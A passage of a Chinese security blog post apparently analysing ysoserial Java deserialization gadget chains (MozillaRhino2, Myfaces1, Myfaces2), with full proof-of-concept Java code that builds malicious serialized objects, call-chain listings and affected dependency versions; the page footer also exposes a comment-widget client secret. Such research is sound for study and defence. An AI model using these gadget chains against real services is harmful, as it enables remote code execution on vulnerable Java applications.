+<p>同时其 <code>getIds()</code> 方法返回空。</p>
+<figure data-type="image" tabindex="29"><img src="https://su18.org/post-images/1627983863758.png" alt="" loading="lazy"></figure>
+<p><code>ScriptableObject.getPropertyIds()</code> 这个方法会调用 obj 的 <code>getIds()</code>，还会调用其原型 prototype 的 <code>getIds()</code>。</p>
+<figure data-type="image" tabindex="30"><img src="https://su18.org/post-images/1627983563530.png" alt="" loading="lazy"></figure>
+<p>ysoserial  使用了 <code>org.mozilla.javascript.tools.shell.Environment</code> 作为 NativeJavaArray 的原型触发，Environment 的 <code>getIds()</code> 方法调用 super 也就是 <code>ScriptableObject.getIds()</code></p>
+<figure data-type="image" tabindex="31"><img src="https://su18.org/post-images/1627984054866.png" alt="" loading="lazy"></figure>
+<p>方法从 firstAdded 成员变量中获取 Slot name 并返回。</p>
+<figure data-type="image" tabindex="32"><img src="https://su18.org/post-images/1627984461000.png" alt="" loading="lazy"></figure>
+<p>这样我们就可以构造出利用链了。</p>
+<h2 id="攻击构造-3">攻击构造</h2>
+<p>这条链我仅仅是看通了调用，对于 Rhino 本身的代码并不了解，所以很难说完全理解了利用链，这里直接使用 ysoserial 的代码来进行攻击构造，先列出几个点：</p>
+<ul>
+<li>ysoserial 使用反射调用 ScriptableObject 的 accessSlot 方法来注册 Slot，直接反射写入firstAdded 应该也可</li>
+<li>为了触发构造，需要使 NativeJavaObject 的 isAdapter 为 true，但是这样在序列化时就会报错，为了避免此情况，需要对其 adapter_writeAdapterObject 成员变量进行篡改。</li>
+</ul>
+<p>最终代码为：</p>
+<pre><code class="language-java">public class MozillaRhino2 {
+
+	public static String fileName = &quot;MozillaRhino2.bin&quot;;
+
+	public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
+		out.writeObject(&quot;java.lang.Object&quot;);
+		out.writeObject(new String[0]);
+		out.writeObject(javaObject);
+	}
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 初始化一个 Environment 对象作为 scope
+		ScriptableObject scope = new Environment();
+		// 创建 associatedValues
+		Map&lt;Object, Object&gt; associatedValues = new Hashtable&lt;&gt;();
+		// 创建一个 ClassCache 实例
+		Object classCacheObject = SerializeUtil.createInstanceUnsafely(ClassCache.class);
+		associatedValues.put(&quot;ClassCache&quot;, classCacheObject);
+
+		Field associateField = ScriptableObject.class.getDeclaredField(&quot;associatedValues&quot;);
+		associateField.setAccessible(true);
+		associateField.set(scope, associatedValues);
+
+		Class&lt;?&gt;       memberBoxClass = Class.forName(&quot;org.mozilla.javascript.MemberBox&quot;);
+		Constructor&lt;?&gt; constructor    = memberBoxClass.getDeclaredConstructor(Method.class);
+		constructor.setAccessible(true);
+		Object initContextMemberBox = constructor.newInstance(Context.class.getMethod(&quot;enter&quot;));
+
+		ScriptableObject initContextScriptableObject = new Environment();
+		Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod(&quot;accessSlot&quot;, String.class, int.class, int.class);
+		makeSlot.setAccessible(true);
+		Object slot = makeSlot.invoke(initContextScriptableObject, &quot;su18&quot;, 0, 4);
+
+		Class&lt;?&gt; slotClass   = Class.forName(&quot;org.mozilla.javascript.ScriptableObject$GetterSlot&quot;);
+		Field    getterField = slotClass.getDeclaredField(&quot;getter&quot;);
+		getterField.setAccessible(true);
+		getterField.set(slot, initContextMemberBox);
+
+
+		// 实例化 NativeJavaObject 类
+		NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
+
+		Field parentField = NativeJavaObject.class.getDeclaredField(&quot;parent&quot;);
+		parentField.setAccessible(true);
+		parentField.set(initContextNativeJavaObject, scope);
+
+		Field isAdapterField = NativeJavaObject.class.getDeclaredField(&quot;isAdapter&quot;);
+		isAdapterField.setAccessible(true);
+		isAdapterField.set(initContextNativeJavaObject, true);
+
+		Field adapterObject = NativeJavaObject.class.getDeclaredField(&quot;adapter_writeAdapterObject&quot;);
+		adapterObject.setAccessible(true);
+		adapterObject.set(initContextNativeJavaObject, MozillaRhino2.class.getDeclaredMethod(&quot;customWriteAdapterObject&quot;,
+				Object.class, ObjectOutputStream.class));
+
+		Field javaObject = NativeJavaObject.class.getDeclaredField(&quot;javaObject&quot;);
+		javaObject.setAccessible(true);
+		javaObject.set(initContextNativeJavaObject, initContextScriptableObject);
+
+		ScriptableObject scriptableObject = new Environment();
+		scriptableObject.setParentScope(initContextNativeJavaObject);
+		makeSlot.invoke(scriptableObject, &quot;outputProperties&quot;, 0, 2);
+
+
+		// 实例化 NativeJavaArray类
+		NativeJavaArray nativeJavaArray = (NativeJavaArray) SerializeUtil.createInstanceUnsafely(NativeJavaArray.class);
+
+		Field parentField2 = NativeJavaObject.class.getDeclaredField(&quot;parent&quot;);
+		parentField2.setAccessible(true);
+		parentField2.set(nativeJavaArray, scope);
+
+		Field javaObject2 = NativeJavaObject.class.getDeclaredField(&quot;javaObject&quot;);
+		javaObject2.setAccessible(true);
+		javaObject2.set(nativeJavaArray, tmpl);
+
+		nativeJavaArray.setPrototype(scriptableObject);
+
+		Field prototypeField = NativeJavaObject.class.getDeclaredField(&quot;prototype&quot;);
+		prototypeField.setAccessible(true);
+		prototypeField.set(nativeJavaArray, scriptableObject);
+
+		// 实例化最外层的 NativeJavaObject
+
+		NativeJavaObject nativeJavaObject = new NativeJavaObject();
+
+		Field parentField3 = NativeJavaObject.class.getDeclaredField(&quot;parent&quot;);
+		parentField3.setAccessible(true);
+		parentField3.set(nativeJavaObject, scope);
+
+		Field isAdapterField3 = NativeJavaObject.class.getDeclaredField(&quot;isAdapter&quot;);
+		isAdapterField3.setAccessible(true);
+		isAdapterField3.set(nativeJavaObject, true);
+
+		Field adapterObject3 = NativeJavaObject.class.getDeclaredField(&quot;adapter_writeAdapterObject&quot;);
+		adapterObject3.setAccessible(true);
+		adapterObject3.set(nativeJavaObject, MozillaRhino2.class.getDeclaredMethod(&quot;customWriteAdapterObject&quot;,
+				Object.class, ObjectOutputStream.class));
+
+		Field javaObject3 = NativeJavaObject.class.getDeclaredField(&quot;javaObject&quot;);
+		javaObject3.setAccessible(true);
+		javaObject3.set(nativeJavaObject, nativeJavaArray);
+
+		SerializeUtil.writeObjectToFile(nativeJavaObject, fileName);
+		SerializeUtil.readFileObject(fileName);
+
+	}
+
+}
+</code></pre>
+<h2 id="总结-3">总结</h2>
+<p>以上就是 MozillaRhino2 链分析的全部内容了，可以看到，这两条链的作者对 Rhino 的功能和实现特别了解，调用链十分长且难懂，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>NativeJavaObject 在反序列化时调用 JavaAdapter 的 readAdapterObject 来处理指定的 NativeJavaArray 类，会调用其中 prototype 中的 Environment 类中 slots 的 getter 方法，由 JavaMembers 的 get 方法触发。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>org.mozilla.javascript.NativeJavaObject#readObject()</code></li>
+<li>sink gadget：<code>org.mozilla.javascript.JavaMembers#get()</code></li>
+<li>chain gadget：<code>org.mozilla.javascript.JavaAdapter#getAdapterClass()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>NativeJavaObject.readObject()
+    JavaAdapter.readAdapterObject()
+        JavaAdapter.getAdapterClass()
+            JavaAdapter.getObjectFunctionNames()
+                ScriptableObject.getPropertyIds()
+                    NativeJavaArray.getIds()
+                        Environment.getIds()
+                            ScriptableObject.getIds()
+                                ScriptableObject.getProperty()
+                                    NativeJavaArray.get()
+                                        JavaMembers.get()
+                                            TemplatesImpl.getOutputProperties()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>rhino-js &gt; 1.6R6</p>
+</blockquote>
+<h1 id="myfaces1">Myfaces1</h1>
+<p>Apache MyFaces 是 Apache 软件基金会的一个项目，托管着多个与 JavaServer™ Faces (JSF) 技术相关的子项目。</p>
+<p>MyFaces Core 项目是 JSF 规范的实现，依赖 myfaces-api、myfaces-impl。本条利用链就在 myfaces-impl 依赖中。</p>
+<p>这条链可以说是一个取巧的利用链，因为它结合了反序列化与 EL 表达式执行的相关特点，其中 MyFaces 提供了触发利用的条件，但是真正执行 EL 表达式解析和处理的还需要有具体的 EL 实现类，如 juel 和 apache-el。</p>
+<h2 id="前置知识-4">前置知识</h2>
+<h3 id="valueexpressionmethodexpression">ValueExpressionMethodExpression</h3>
+<p><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code> 是一个封装了 ValueExpression 的 MethodExpression。</p>
+<p>此类的 <code>hashCode()</code> 方法会调用 <code>getMethodExpression()</code> 获取 MethodExpression 再调用 MethodExpression 的 hashCode 方法。</p>
+<figure data-type="image" tabindex="33"><img src="https://su18.org/post-images/1628055643685.png" alt="" loading="lazy"></figure>
+<p><code>getMethodExpression()</code> 方法则会调用 valueExpression 对象的 getValue 方法，这其实就会触发EL 表达式的解析，返回 ValueExpression 的实例。这部分的解析逻辑与之前我写过的 Struts2 漏洞系列文章的 OGNL 表达式解析有相似之处。</p>
+<figure data-type="image" tabindex="34"><img src="https://su18.org/post-images/1628055636610.png" alt="" loading="lazy"></figure>
+<p>也就是说 ValueExpressionMethodExpression 的 hashCode 实际就是封装的 ValueExpression 解析过后的实例的 hashCode。</p>
+<p>可以发现漏洞触发链还是比较简单的，我们只需要创建一个带有恶意 EL 表达式的 ValueExpression ，并用它来实例化 ValueExpressionMethodExpression 类，就可以使用反序列化 HashMap 来触发其 hashCode 方法。</p>
+<h2 id="攻击构造-4">攻击构造</h2>
+<p>由于作者本人对 EL 表达式的相关编写了解不足，这里不进行 payload 的编写示范，反序列化的利用代码为：</p>
+<pre><code class="language-java">public class Myfaces1 {
+
+	public static String fileName = &quot;Myfaces1.bin&quot;;
+
+	public static String payload = &quot;${1+1}&quot;;
+
+	public static Object generatePayload(String payloads) throws Exception {
+
+		// 初始化 FacesContext 及 ELContext
+		FacesContextImpl fc        = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
+		ELContext        elContext = new FacesELContext(new CompositeELResolver(), fc);
+
+		// 使用反射将 elContext 写入 FacesContextImpl 中
+		Field field = FacesContextImplBase.class.getDeclaredField(&quot;_elContext&quot;);
+		field.setAccessible(true);
+		field.set(fc, elContext);
+
+		// 使用 ExpressionFactory 创建 ValueExpression
+		ExpressionFactory expressionFactory = ExpressionFactory.newInstance();
+		// 有害的 ValueExpression
+		ValueExpression valueExpression = expressionFactory.createValueExpression(elContext, payloads, Object.class);
+		// 无害的 ValueExpression
+		ValueExpression harmlessExpression = expressionFactory.createValueExpression(elContext, &quot;${true}&quot;, Object.class);
+
+		// 使用 ValueExpression 初始化 ValueExpressionMethodExpression
+		ValueExpressionMethodExpression expression = new ValueExpressionMethodExpression(harmlessExpression);
+
+		HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+		map.put(expression, &quot;su18&quot;);
+		map.put(&quot;su19&quot;, &quot;su20&quot;);
+
+		// 先放入带有无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段避免触发
+		Field field1 = expression.getClass().getDeclaredField(&quot;valueExpression&quot;);
+		field1.setAccessible(true);
+		field1.set(expression, valueExpression);
+
+		return map;
+	}
+
+
+	public static void main(String[] args) throws Exception {
+		SerializeUtil.writeObjectToFile(generatePayload(payload), fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结-4">总结</h2>
+<p>以上就是 Myfaces1 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>通过反序列化 HashMap 来触发 ValueExpressionMethodExpression 的 hashCode 方法，会调用 ValueExpression 的 getValue 方法解析恶意表达式触发漏洞。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>javax.el.ValueExpression#getValue()</code></li>
+<li>chain gadget：<code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression#getMethodExpression()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>HashMap.readObject()
+    ValueExpressionMethodExpression.hashCode()
+        ValueExpressionMethodExpression.getMethodExpression()
+            ValueExpression.getValue()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>myfaces-impl : 2.2.9<br>
+myfaces-api : 2.2.9<br>
+javax.servlet-api : 3.1.0<br>
+juel-impl : 2.2.7 / apache-el : 8.0.27<br>
+juel-api : 2.2.7</p>
+</blockquote>
+<h1 id="myfaces2">Myfaces2</h1>
+<p>由于 Myface1 仅仅提供了 EL 表达式执行的点，但是没有给出攻击 payload，需要 ysoserial 的使用者自己构造 EL 表达式进行解析和执行。</p>
+<p>不像其他的 payload，直接给出待执行命令就能用，所以这将大大提高使用门槛，所以 Myface2 在使用 Myface1 利用链的基础上，添加了使用 ClassLoader 去远程 load 远端恶意类的 EL 表达式执行代码，来为 Myfaces 链提供利用手段。</p>
+<p>仅涉及到恶意 EL 表达式的编写，这里不占篇幅。</p>
+<figure data-type="image" tabindex="35"><img src="https://su18.org/post-images/1628048838772.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#fileupload1">FileUpload1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#diskfileitem">DiskFileItem</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+<li><a href="#wicket1">Wicket1</a></li>
+<li><a href="#mozillarhino1">MozillaRhino1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2">前置知识</a>
+<ul>
+<li><a href="#nativeerror">NativeError</a></li>
+<li><a href="#nativejavamethod">NativeJavaMethod</a></li>
+<li><a href="#memberbox">MemberBox</a></li>
+<li><a href="#nativejavaobject">NativeJavaObject</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-2">总结</a></li>
+</ul>
+</li>
+<li><a href="#mozillarhino2">MozillaRhino2</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3">前置知识</a>
+<ul>
+<li><a href="#javamembers">JavaMembers</a></li>
+<li><a href="#nativejavaobject-2">NativeJavaObject</a></li>
+<li><a href="#nativejavaarray-environment">NativeJavaArray + Environment</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-3">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-3">总结</a></li>
+</ul>
+</li>
+<li><a href="#myfaces1">Myfaces1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-4">前置知识</a>
+<ul>
+<li><a href="#valueexpressionmethodexpression">ValueExpressionMethodExpression</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-4">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-4">总结</a></li>
+</ul>
+</li>
+<li><a href="#myfaces2">Myfaces2</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
